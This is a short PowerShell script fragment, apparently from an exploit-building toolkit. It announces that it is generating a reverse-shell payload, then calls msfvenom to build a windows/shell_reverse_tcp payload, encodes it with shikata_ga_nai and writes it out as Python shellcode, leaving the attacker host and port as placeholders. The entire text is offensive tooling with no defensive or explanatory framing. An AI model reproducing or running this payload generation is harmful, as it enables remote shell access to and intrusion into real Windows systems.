Write-Host "Generating Reverse-Shell Payload..."

.\external-tools\Custom-Compacted-MSF\bin\msfvenom.bat -p windows/shell_reverse_tcp LHOST=[] LPORT={} -b '\x00' -e x86/shikata_ga_nai -f python -o .\scripts\shellcode.txt